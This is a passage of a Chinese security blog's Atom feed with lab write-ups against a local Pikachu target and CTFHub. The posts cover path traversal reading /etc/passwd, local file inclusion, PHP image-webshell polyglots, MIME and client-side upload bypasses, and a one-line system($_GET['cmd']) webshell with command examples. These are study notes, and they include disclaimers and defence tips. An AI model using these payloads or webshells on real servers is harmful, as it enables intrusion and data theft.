+    <id>https://lzzy-rz.github.io/Crow.github.io/2026/11/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-%E6%96%87%E4%BB%B6%E5%A4%B4%E6%A3%80%E6%9F%A5/</id>
+    <link href="https://lzzy-rz.github.io/Crow.github.io/2026/11/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-%E6%96%87%E4%BB%B6%E5%A4%B4%E6%A3%80%E6%9F%A5/"/>
+    <published>2026-11-09T13:09:06.000Z</published>
+    <summary>
+      <![CDATA[<p>工具:burpsuite</p>
+<p>题源:Ctfhub</p>
+<p>内容:在文件上传文件头检查类型中拿到flag</p>
+<p>原理:服务器通过检查文件的前几个字节来判断文件类型,后面的看都不看</p>
+<p>思路:用图片马骗过服务器</p>
+<h2 id="1-进入]]>
+    </summary>
+    <title>文件上传(文件头检查)</title>
+    <updated>2026-11-09T13:43:14.632Z</updated>
+  </entry>
+  <entry>
+    <author>
+      <name>Crow.</name>
+    </author>
+    <category term="文件下载" scheme="https://lzzy-rz.github.io/Crow.github.io/categories/%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/"/>
+    <category term="Web" scheme="https://lzzy-rz.github.io/Crow.github.io/tags/Web/"/>
+    <category term="Pikachu" scheme="https://lzzy-rz.github.io/Crow.github.io/tags/Pikachu/"/>
+    <category term="文件下载" scheme="https://lzzy-rz.github.io/Crow.github.io/tags/%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/"/>
+    <content>
+      <![CDATA[<p>工具:curl</p><p>环境:本地 Pikachu 靶场</p><p>内容:验证网页文件下载漏洞存在</p><p>原理:网站把“用户给的文件名”直接拿过去读,没有进行限制,类似于文件包含,区别是文件下载是把文件内容给你,而文件包含是打开文件并交给php解析.</p><h2 id="1-进入本地靶场"><a href="#1-进入本地靶场" class="headerlink" title="1,进入本地靶场"></a>1,进入本地靶场</h2><img width="2470" height="928" alt="Image" src="https://github.com/user-attachments/assets/23e38104-2cd8-4797-b502-8487536ba8a9" /><h2 id="2-先下载一个科比看看路径-找下载的入口"><a href="#2-先下载一个科比看看路径-找下载的入口" class="headerlink" title="2,先下载一个科比看看路径(找下载的入口)"></a>2,先下载一个科比看看路径(找下载的入口)</h2><img width="2480" height="968" alt="Image" src="https://github.com/user-attachments/assets/53f8df30-d05c-4b40-83a6-40950d7119a9" /><p>发现路径没变</p><h2 id="3-查看下载链接指向哪儿"><a href="#3-查看下载链接指向哪儿" class="headerlink" title="3,查看下载链接指向哪儿"></a>3,查看下载链接指向哪儿</h2><p>我们在终端用 <code>curl -s &#39;http://127.0.0.1:8080/vul/unsafedownload/down_nba.php&#39; | grep -oE &#39;href=&quot;[^&quot;]+&quot;&#39; | head -n 20</code> 查看</p><img width="1360" height="640" alt="Image" src="https://github.com/user-attachments/assets/08fca313-8b99-49d3-aa08-eb83a94c7ced" /><p>前面全是 CSS，球员链接应该在页面后面。</p><h2 id="4-换成看尾部"><a href="#4-换成看尾部" class="headerlink" title="4,换成看尾部"></a>4,换成看尾部</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -s <span class="hljs-string">&#x27;http://127.0.0.1:8080/vul/unsafedownload/down_nba.php&#x27;</span> | grep -oE <span class="hljs-string">&#x27;href=&quot;[^&quot;]+&quot;&#x27;</span> | <span class="hljs-built_in">tail</span> -n 30<br></code></pre></td></tr></table></figure><img width="1440" height="812" alt="Image" src="https://github.com/user-attachments/assets/c1221253-3482-4e51-be9f-b4fe046b0eca" /><p>找到了下载口execdownload.php?filename&#x3D;kb.png</p><h2 id="5-验证漏洞存在"><a href="#5-验证漏洞存在" class="headerlink" title="5,验证漏洞存在"></a>5,验证漏洞存在</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -s -D - <span class="hljs-string">&#x27;http://127.0.0.1:8080/vul/unsafedownload/execdownload.php?filename=../../../../etc/passwd&#x27;</span><br></code></pre></td></tr></table></figure><img width="1518" height="796" alt="Image" src="https://github.com/user-attachments/assets/468394ca-c233-44c6-9dca-7ed5223fa5a8" /><p>返回200,文件内容也对的上</p><hr><p>⚠️ 声明：本文涉及的攻击技术仅供网络安全学习与授权测试（如CTF靶场）使用。严禁用于任何未授权的真实网络环境，否则将触犯法律！</p>]]>
+    </content>
+    <id>https://lzzy-rz.github.io/Crow.github.io/2026/10/28/%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD-Unsafe-File-Download/</id>
+    <link href="https://lzzy-rz.github.io/Crow.github.io/2026/10/28/%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD-Unsafe-File-Download/"/>
+    <published>2026-10-28T06:33:20.000Z</published>
+    <summary>
+      <![CDATA[<p>工具:curl</p>
+<p>环境:本地 Pikachu 靶场</p>
+<p>内容:验证网页文件下载漏洞存在</p>
+<p>原理:网站把“用户给的文件名”直接拿过去读,没有进行限制,类似于文件包含,区别是文件下载是把文件内容给你,而文件包含是打开文件并交给php解析.</p]]>
+    </summary>
+    <title>文件下载(Unsafe File Download)</title>
+    <updated>2026-10-28T07:14:33.138Z</updated>
+  </entry>
+  <entry>
+    <author>
+      <name>Crow.</name>
+    </author>
+    <category term="文件包含" scheme="https://lzzy-rz.github.io/Crow.github.io/categories/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
+    <category term="Web" scheme="https://lzzy-rz.github.io/Crow.github.io/tags/Web/"/>
+    <category term="Curl" scheme="https://lzzy-rz.github.io/Crow.github.io/tags/Curl/"/>
+    <category term="Pikachu" scheme="https://lzzy-rz.github.io/Crow.github.io/tags/Pikachu/"/>
+    <category term="文件包含" scheme="https://lzzy-rz.github.io/Crow.github.io/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
+    <content>
+      <![CDATA[<p>工具:Curl</p><p>环境:本地 Pikachu 靶场</p><p>内容:挖掘文件包含local的漏洞</p><p>原理:文件包含:php里有一个include(),作用是把这个文件的内容拿到当前的页面来,如果没规定只能拿什么文件,就可以让它去别的目录拿文件,如果遇到普通文本,会把文字显示出来,如果是php代码还会执行</p><h2 id="1-进入本地皮卡丘靶场"><a href="#1-进入本地皮卡丘靶场" class="headerlink" title="1,进入本地皮卡丘靶场"></a>1,进入本地皮卡丘靶场</h2><img width="1558" height="826" alt="Image" src="https://github.com/user-attachments/assets/6b3fd314-70e5-41af-979f-a616dedaaa8e" /><h2 id="2-选择人物点击submit"><a href="#2-选择人物点击submit" class="headerlink" title="2,选择人物点击submit"></a>2,选择人物点击submit</h2><img width="1548" height="794" alt="Image" src="https://github.com/user-attachments/assets/65519346-78eb-4148-90a8-15af967bb44c" />发现url地址中包含filename=file1.php<h2 id="3-现在把url换成系统的只读文件"><a href="#3-现在把url换成系统的只读文件" class="headerlink" title="3,现在把url换成系统的只读文件"></a>3,现在把url换成系统的只读文件</h2><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">http://127.0.0.1:8080/vul/fileinclude/fi_local.php?filename=../../../../etc/passwd&amp;submit=Submit<br></code></pre></td></tr></table></figure><img width="1544" height="860" alt="Image" src="https://github.com/user-attachments/assets/e9979318-2d49-4bbb-b0b4-e252553657f7" />/etc/passwd 已经被原样读出来了,filename 本来该填 file1.php,却被我们拿去指定系统文件.<h2 id="4-更有意思的是，之前那只“图片马”可以派上用场-把它交给-include-时，服务器不会再看-png-后缀，而是直接把文件内容丢给-PHP-解析器"><a href="#4-更有意思的是，之前那只“图片马”可以派上用场-把它交给-include-时，服务器不会再看-png-后缀，而是直接把文件内容丢给-PHP-解析器" class="headerlink" title="4,更有意思的是，之前那只“图片马”可以派上用场.把它交给 include() 时，服务器不会再看 .png 后缀，而是直接把文件内容丢给 PHP 解析器"></a>4,更有意思的是，之前那只“图片马”可以派上用场.把它交给 include() 时，服务器不会再看 .png 后缀，而是直接把文件内容丢给 PHP 解析器</h2><p>我们利用url上传我们的图片马</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">http://127.0.0.1:8080/vul/fileinclude/fi_local.php?filename=/app/vul/unsafeupload/uploads/2026/10/23/9209656adaf24988ddd610297742.png&amp;submit=Submit<br></code></pre></td></tr></table></figure><p>再用 <code>curl -s &#39;http://127.0.0.1:8080/vul/fileinclude/fi_local.php?filename=../../unsafeupload/uploads/2026/10/23/9209656adaf24988ddd610297742.png&amp;submit=Submit&#39; | strings | grep -E &#39;GETIMAGESIZE_OK|&lt;\?php&#39;</code> 查看结果</p><img width="2450" height="112" alt="Image" src="https://github.com/user-attachments/assets/0b85db02-345a-4ca6-a2b0-1ab4e6998ccb" /><p>成功地返回了proof.</p><hr><p>⚠️ 声明：本文涉及的攻击技术仅供网络安全学习与授权测试（如CTF靶场）使用。严禁用于任何未授权的真实网络环境，否则将触犯法律！</p>]]>
+    </content>
+    <id>https://lzzy-rz.github.io/Crow.github.io/2026/10/24/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABlocal/</id>
+    <link href="https://lzzy-rz.github.io/Crow.github.io/2026/10/24/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABlocal/"/>
+    <published>2026-10-24T04:24:10.000Z</published>
+    <summary>
+      <![CDATA[<p>工具:Curl</p>
+<p>环境:本地 Pikachu 靶场</p>
+<p>内容:挖掘文件包含local的漏洞</p>
+<p>原理:文件包含:php里有一个include(),作用是把这个文件的内容拿到当前的页面来,如果没规定只能拿什么文件,就可以让它去别的目录拿文件,如]]>
+    </summary>
+    <title>文件包含local</title>
+    <updated>2026-10-28T07:14:33.145Z</updated>
+  </entry>
+  <entry>
+    <author>
+      <name>Crow.</name>
+    </author>
+    <category term="文件上传" scheme="https://lzzy-rz.github.io/Crow.github.io/categories/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
+    <category term="CTF" scheme="https://lzzy-rz.github.io/Crow.github.io/tags/CTF/"/>
+    <category term="Web" scheme="https://lzzy-rz.github.io/Crow.github.io/tags/Web/"/>
+    <category term="文件上传" scheme="https://lzzy-rz.github.io/Crow.github.io/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
+    <category term="WebShell" scheme="https://lzzy-rz.github.io/Crow.github.io/tags/WebShell/"/>
+    <content>
+      <![CDATA[<p>今天时间充足,效率也不错,在此梳理整理一下一句话木马的使用方法,以及如何防守</p><h2 id="何为一句话木马"><a href="#何为一句话木马" class="headerlink" title="何为一句话木马:"></a>何为一句话木马:</h2><p>本质是一段极其简单的恶意脚本,以php为例,最经典的一句话木马如下:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]); <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>逐词解析:</p><ul><li><code>&lt;?php ... ?&gt;</code> 标识符,告诉服务器中间的内容请当做php代码来执行.</li><li><code>system(...)</code> php的内置函数,作用是执行系统底层命令</li><li><code>$_GET[&#39;cmd&#39;]</code> 用来接收参数(Hey bro,去浏览器的URL里找一个叫cmd的参数,把它的值拿过来)</li></ul><p>总结:就像遥控器一样,只要你通过URL里传入一个名为cmd的命令,服务器就会执行</p><h2 id="关键1-找到地址"><a href="#关键1-找到地址" class="headerlink" title="关键1:找到地址"></a>关键1:找到地址</h2><p>Why:我们通过文件上传一句话木马后还不够,因为文件上传之后处于”休眠”状态,我们必须通过准确的URL路径访问,才能触发服务器的解析并执行代码.</p><p>How:真实环境中服务器通常会重命名或移动上传文件,可以通过报错回显,目录扫描,或全盘搜索(grep)确认绝对路径,才能成功连接并控制服务器.(By the way,现在这些我都不会,keep going!)错误路径会给404,路径正确会返回200</p><h2 id="关键2-测试权限"><a href="#关键2-测试权限" class="headerlink" title="关键2:测试权限"></a>关键2:测试权限</h2><p>用?cmd&#x3D;whoami测试成功后,会返回用户名</p><p>www-data&#x2F;apache&#x2F;nginx是web的普通员工权限,是绝大多数漏洞拿到的权限</p><p>root是最高统帅,可以让整个系统想干嘛干嘛.</p><h2 id="关健3-调用指令"><a href="#关健3-调用指令" class="headerlink" title="关健3:调用指令"></a>关健3:调用指令</h2><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs text">1,看根目录: ?cmd=ls /<br>2,看当前目录: ?cmd=ls<br>3,找到可以文件后读取: ?cmd=cat /flag.txt<br></code></pre></td></tr></table></figure><p>*在ctf中如果是空白页,可以尝试用base64强转,再去解码</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">?cmd=base64 /flag_xxx.php<br></code></pre></td></tr></table></figure><h2 id="4-防守策略"><a href="#4-防守策略" class="headerlink" title="4:防守策略"></a>4:防守策略</h2><p>1,禁用危险函数<br>2,严格校验文件上传:MIME类型,文件后缀,文件头<br>3,重命名文件</p><hr><p>⚠️ 声明：本文涉及的攻击技术仅供网络安全学习与授权测试（如CTF靶场）使用。严禁用于任何未授权的真实网络环境，否则将触犯法律！</p>]]>
+    </content>
+    <id>https://lzzy-rz.github.io/Crow.github.io/2026/10/23/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E5%B0%8F%E4%B8%93%E6%A0%8F/</id>
+    <link href="https://lzzy-rz.github.io/Crow.github.io/2026/10/23/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E5%B0%8F%E4%B8%93%E6%A0%8F/"/>
+    <published>2026-10-23T07:12:52.000Z</published>
+    <summary>
+      <![CDATA[<p>今天时间充足,效率也不错,在此梳理整理一下一句话木马的使用方法,以及如何防守</p>
+<h2 id="何为一句话木马"><a href="#何为一句话木马" class="headerlink" title="何为一句话木马:"></a>何为一句话木马:</h2><p>本质]]>
+    </summary>
+    <title>一句话木马小专栏</title>
+    <updated>2026-10-25T03:59:35.610Z</updated>
+  </entry>
+  <entry>
+    <author>
+      <name>Crow.</name>
+    </author>
+    <category term="文件上传" scheme="https://lzzy-rz.github.io/Crow.github.io/categories/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
+    <category term="文件上传" scheme="https://lzzy-rz.github.io/Crow.github.io/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
+    <category term="Curl" scheme="https://lzzy-rz.github.io/Crow.github.io/tags/Curl/"/>
+    <category term="getimagesize" scheme="https://lzzy-rz.github.io/Crow.github.io/tags/getimagesize/"/>
+    <category term="Pikachu" scheme="https://lzzy-rz.github.io/Crow.github.io/tags/Pikachu/"/>
+    <content>
+      <![CDATA[<p>工具:curl</p><p>环境:本地 Pikachu 靶场</p><p>内容:验证getimagesize可绕过</p><p>原理:getimagesize() 的核心是：不相信文件名,也不相信 Content-Type,而是自己读文件内容.服务器会把上传后的临时文件交给它，它会去找图片的真实结构,如果把一个真正的 PNG 放在前面，再在尾部塞一段 PHP，就可能做成“图片马”，让图片检查通过、PHP 也跟着落盘</p><h2 id="1-进入本地靶场"><a href="#1-进入本地靶场" class="headerlink" title="1,进入本地靶场"></a>1,进入本地靶场</h2><img width="1544" height="1322" alt="Image" src="https://github.com/user-attachments/assets/a6fc5526-c81a-4c40-993b-e1fd6c7ae7d4" /><h2 id="2-制作图片马"><a href="#2-制作图片马" class="headerlink" title="2,制作图片马"></a>2,制作图片马</h2><p>终端运行–&gt;</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">kb_path=<span class="hljs-string">&quot;<span class="hljs-subst">$(find <span class="hljs-string">&quot;<span class="hljs-variable">$HOME</span>&quot;</span> -type f -iname &#x27;kb.png&#x27; -print -quit)</span>&quot;</span><br><span class="hljs-built_in">cp</span> -- <span class="hljs-string">&quot;<span class="hljs-variable">$kb_path</span>&quot;</span> <span class="hljs-string">&quot;<span class="hljs-variable">$HOME</span>/Desktop/gis_kb_probe.png&quot;</span><br><span class="hljs-built_in">printf</span> <span class="hljs-string">&#x27;\n&lt;?php echo &quot;GETIMAGESIZE_OK&quot;; ?&gt;\n&#x27;</span> &gt;&gt; <span class="hljs-string">&quot;<span class="hljs-variable">$HOME</span>/Desktop/gis_kb_probe.png&quot;</span><br>file <span class="hljs-string">&quot;<span class="hljs-variable">$HOME</span>/Desktop/gis_kb_probe.png&quot;</span><br></code></pre></td></tr></table></figure><p>复制那张 kb.png，再往尾部追加测试标记</p><p>代码解读:</p><ul><li>_path–&gt;路径</li><li>find–&gt;找到kb.png</li><li>cp–&gt;复制成测试文件</li><li>printf &gt;&gt; –&gt;在文件尾部加上php代码</li></ul><p>这时文件仍然是 PNG，前面的图片数据没有变化，只是在尾部长出了一小段 PHP 文本</p><h2 id="3-上传图片马"><a href="#3-上传图片马" class="headerlink" title="3,上传图片马"></a>3,上传图片马</h2><img width="1542" height="1426" alt="Image" src="https://github.com/user-attachments/assets/ab92c5ee-e736-4d8a-87e7-604607c1e32c" /><h2 id="4-验证"><a href="#4-验证" class="headerlink" title="4,验证"></a>4,验证</h2><p>终端运行–&gt;</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -s <span class="hljs-string">&#x27;http://127.0.0.1:8080/vul/unsafeupload/uploads/2026/10/23/9209656adaf24988ddd610297742.png&#x27;</span> | strings | grep GETIMAGESIZE_OK<br></code></pre></td></tr></table></figure><p>代码解读:</p><ul><li>curl–&gt;发送http请求,这里用get下载文件</li><li>-s –&gt;隐藏下载进度和普通错误信息</li><li><code>|</code>：管道，把前一条命令的输出交给后一条命令</li><li>strings：从二进制文件中提取连续的可打印字符</li><li>PNG 的大部分内容是二进制数据，直接看会是一堆乱码。但文件尾部追加的：<code>&lt;?php echo &quot;GETIMAGESIZE_OK&quot;; ?&gt;</code>是可读文本，所以 strings 能把它捞出来.</li><li>grep：在一段文字中搜索指定内容</li><li>GETIMAGESIZE_OK：只保留包含这个标记的行</li></ul><p>最后返回了完整的代码</p><img width="1684" height="188" alt="Image" src="https://github.com/user-attachments/assets/a2d10c2d-8599-47ad-937c-570433be807f" /><p>说明getmagesize被绕过了，但随机改名和 .png 后缀把攻击链后半截截断了</p><hr><p>⚠️ 声明：本文涉及的攻击技术仅供网络安全学习与授权测试（如CTF靶场）使用。严禁用于任何未授权的真实网络环境，否则将触犯法律！</p>]]>
+    </content>
+    <id>https://lzzy-rz.github.io/Crow.github.io/2026/10/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-getimagesize/</id>
+    <link href="https://lzzy-rz.github.io/Crow.github.io/2026/10/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-getimagesize/"/>
+    <published>2026-10-23T05:49:35.000Z</published>
+    <summary>
+      <![CDATA[<p>工具:curl</p>
+<p>环境:本地 Pikachu 靶场</p>
+<p>内容:验证getimagesize可绕过</p>
+<p>原理:getimagesize() 的核心是：不相信文件名,也不相信 Content-Type,而是自己读文件内容.服务器会把上传后的临时文]]>
+    </summary>
+    <title>文件上传(getimagesize)</title>
+    <updated>2026-10-25T03:59:35.610Z</updated>
+  </entry>
+  <entry>
+    <author>
+      <name>Crow.</name>
+    </author>
+    <category term="文件上传" scheme="https://lzzy-rz.github.io/Crow.github.io/categories/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
+    <category term="文件上传" scheme="https://lzzy-rz.github.io/Crow.github.io/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
+    <category term="Pikachu" scheme="https://lzzy-rz.github.io/Crow.github.io/tags/Pikachu/"/>
+    <category term="Burp Suite" scheme="https://lzzy-rz.github.io/Crow.github.io/tags/Burp-Suite/"/>
+    <category term="MIME" scheme="https://lzzy-rz.github.io/Crow.github.io/tags/MIME/"/>
+    <content>
+      <![CDATA[<p>工具:Burpsuite</p><p>环境:本地 Pikachu 靶场</p><p>内容:挖掘文件上传MIME Type的漏洞</p><p>原理:MIME相当于一个快递箱,上面可以标注快递箱里的物品类别,但是我们是发件人,可以自己更换箱子,标签可以告诉服务器该怎么处理，但不一定代表里面真的是什么.</p><h2 id="1-使用火狐浏览器打开本地的皮卡丘靶场-打开Burpsuite"><a href="#1-使用火狐浏览器打开本地的皮卡丘靶场-打开Burpsuite" class="headerlink" title="1,使用火狐浏览器打开本地的皮卡丘靶场,打开Burpsuite"></a>1,使用火狐浏览器打开本地的皮卡丘靶场,打开Burpsuite</h2><h2 id="2-打开Burpsuite的intercept-上传我们的proof-php文件"><a href="#2-打开Burpsuite的intercept-上传我们的proof-php文件" class="headerlink" title="2,打开Burpsuite的intercept,上传我们的proof.php文件"></a>2,打开Burpsuite的intercept,上传我们的proof.php文件</h2><p>但是一直无法抓到包,所以改用了Burp自带的浏览器</p><p>这一次很成功的拦截到了</p><img width="1314" height="632" alt="Image" src="https://github.com/user-attachments/assets/117a54aa-fcce-40f3-889e-1caf9327b3b3" /><h2 id="3-找到包里的Content-Type"><a href="#3-找到包里的Content-Type" class="headerlink" title="3,找到包里的Content-Type"></a>3,找到包里的Content-Type</h2><img width="614" height="42" alt="Image" src="https://github.com/user-attachments/assets/b6573aae-0bd9-4da9-81bd-a2383d6e7bcf" /><p>我们将这里的Content-Type改为image&#x2F;png  并将请求放行</p><h2 id="4-页面上给出了文件的保存路径-访问"><a href="#4-页面上给出了文件的保存路径-访问" class="headerlink" title="4,页面上给出了文件的保存路径,访问"></a>4,页面上给出了文件的保存路径,访问</h2><img width="1134" height="570" alt="Image" src="https://github.com/user-attachments/assets/eea3d884-c483-4ad1-bdf5-6f07c6e0843b" /><p>访问路径,看到了我们让服务器输出的文字</p><img width="1134" height="918" alt="Image" src="https://github.com/user-attachments/assets/a58c3ae7-28c8-4467-af99-2cf04aab4d6a" /><p>说明服务器相信了客户端自己填写的 MIME<br>proof.php 能执行也说明上传目录没禁 PHP</p><hr><p>⚠️ 声明：本文涉及的攻击技术仅供网络安全学习与授权测试（如CTF靶场）使用。严禁用于任何未授权的真实网络环境，否则将触犯法律！</p>]]>
+    </content>
+    <id>https://lzzy-rz.github.io/Crow.github.io/2026/10/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0MIME-Type/</id>
+    <link href="https://lzzy-rz.github.io/Crow.github.io/2026/10/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0MIME-Type/"/>
+    <published>2026-10-23T04:02:07.000Z</published>
+    <summary>
+      <![CDATA[<p>工具:Burpsuite</p>
+<p>环境:本地 Pikachu 靶场</p>
+<p>内容:挖掘文件上传MIME Type的漏洞</p>
+<p>原理:MIME相当于一个快递箱,上面可以标注快递箱里的物品类别,但是我们是发件人,可以自己更换箱子,标签可以告诉服务器该怎么处理]]>
+    </summary>
+    <title>文件上传(MIME Type)</title>
+    <updated>2026-10-25T03:59:35.608Z</updated>
+  </entry>
+  <entry>
+    <author>
+      <name>Crow.</name>
+    </author>
+    <category term="文件上传" scheme="https://lzzy-rz.github.io/Crow.github.io/categories/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
+    <category term="文件上传" scheme="https://lzzy-rz.github.io/Crow.github.io/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
+    <category term="Curl" scheme="https://lzzy-rz.github.io/Crow.github.io/tags/Curl/"/>
+    <category term="Pikachu" scheme="https://lzzy-rz.github.io/Crow.github.io/tags/Pikachu/"/>
+    <category term="Burp Suite" scheme="https://lzzy-rz.github.io/Crow.github.io/tags/Burp-Suite/"/>
+    <content>
+      <![CDATA[<p>工具:Burpsuite,Curl</p><p>环境:本地 Pikachu 靶场</p><p>内容:挖掘文件上传client check的漏洞</p><p>原理:用户选择文件时,会检查文件扩展名,选择其他类型文件时,浏览器的JS就已经拦截了(请求没发送出去),所以采用用图片后缀的方式,绕过浏览器的拦截,让它成功发送请求.我们拦截发送的请求,并将伪装过的文件换回原来的后缀,发送给服务器.如果服务器没有拦截,并且能执行我们上传的代码,说明改服务器可被控制.</p><h2 id="1-先打开Burpsuite用自带的浏览器进入我们的靶场"><a href="#1-先打开Burpsuite用自带的浏览器进入我们的靶场" class="headerlink" title="1,先打开Burpsuite用自带的浏览器进入我们的靶场"></a>1,先打开Burpsuite用自带的浏览器进入我们的靶场</h2><img width="1216" height="1259" alt="Image" src="https://github.com/user-attachments/assets/02de7cc3-1540-4f38-98ec-48acff7a803f" /><p>上面显示仅允许上传图片</p><h2 id="2-打开burpsuite的intercept-上传一个-png图片-来看请求结构"><a href="#2-打开burpsuite的intercept-上传一个-png图片-来看请求结构" class="headerlink" title="2,打开burpsuite的intercept,上传一个.png图片,来看请求结构"></a>2,打开burpsuite的intercept,上传一个.png图片,来看请求结构</h2><img width="330" height="18" alt="Image" src="https://github.com/user-attachments/assets/fdddff79-8149-42bf-8423-05dc9a191604" /><p>确认浏览器按multipart接受文件</p><h2 id="3-将文件改成-txt看服务器接不接受"><a href="#3-将文件改成-txt看服务器接不接受" class="headerlink" title="3,将文件改成.txt看服务器接不接受"></a>3,将文件改成.txt看服务器接不接受</h2><p>将请求发送到repeater</p><p>将后缀.png改为.txt</p><p>Send</p><p>服务器返回200,说明拦截发生在浏览器,服务器没拦</p><h2 id="4-验证文件是否可以打开"><a href="#4-验证文件是否可以打开" class="headerlink" title="4,验证文件是否可以打开"></a>4,验证文件是否可以打开</h2><img width="242" height="38" alt="Image" src="https://github.com/user-attachments/assets/f786b0f5-7f8b-4110-8502-b7bb9be2d021" /><p>刷新后网页上给出了保存路径</p><p>直接复制访问文件是否可以打开</p><img width="1217" height="1324" alt="Image" src="https://github.com/user-attachments/assets/9e15f11c-fe94-4e94-aa92-c7a04157949c" /><p>成功地返回了我们发送的图片(说明服务器并未对上传的文件类型进行限制)</p><h2 id="5-我们进一步确认服务器是否真正的能够执行我们上传的代码"><a href="#5-我们进一步确认服务器是否真正的能够执行我们上传的代码" class="headerlink" title="5,我们进一步确认服务器是否真正的能够执行我们上传的代码"></a>5,我们进一步确认服务器是否真正的能够执行我们上传的代码</h2><p>新建一个写入了php代码的文件(命名为proof.php)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;UPLOAD_PROOF_OK&quot;</span>; <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>(如果服务器成功执行,会向我们返回UPLOAD_PROOF_OK)</p><p>打开终端,使用Curl直接向服务器发送我们的.php文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -i -F <span class="hljs-string">&quot;uploadfile=@<span class="hljs-variable">$HOME</span>/Desktop/proof.php;filename=proof.php&quot;</span> \  http://127.0.0.1:8080/vul/unsafeupload/clientcheck.php<br></code></pre></td></tr></table></figure><p>最后根据ctrl+shift+F的功能,在终端中找到了文件保存的路径</p><img width="1209" height="128" alt="Image" src="https://github.com/user-attachments/assets/94be5dc8-bcdc-4cef-b0ea-8864ed128691" /><p>访问后得到了结果(说明服务器可以执行我们上传的内容)<br>即我们可用服务器不对上传文件验证的漏洞,向服务器发送指令,使之执行.</p><hr><p>⚠️ 声明：本文涉及的攻击技术仅供网络安全学习与授权测试（如CTF靶场）使用。严禁用于任何未授权的真实网络环境，否则将触犯法律！</p>]]>
+    </content>
+    <id>https://lzzy-rz.github.io/Crow.github.io/2026/10/21/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0File-Inclusion-local-2026-10-21/</id>
+    <link href="https://lzzy-rz.github.io/Crow.github.io/2026/10/21/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0File-Inclusion-local-2026-10-21/"/>
+    <published>2026-10-21T09:54:37.000Z</published>
+    <summary>
+      <![CDATA[<p>工具:Burpsuite,Curl</p>
+<p>环境:本地 Pikachu 靶场</p>
+<p>内容:挖掘文件上传client check的漏洞</p>
+<p>原理:用户选择文件时,会检查文件扩展名,选择其他类型文件时,浏览器的JS就已经拦截了(请求没发送出去),所以采用]]>
+    </summary>
+    <title>文件上传(client check)</title>
+    <updated>2026-10-25T03:59:35.607Z</updated>
+  </entry>
+</feed>
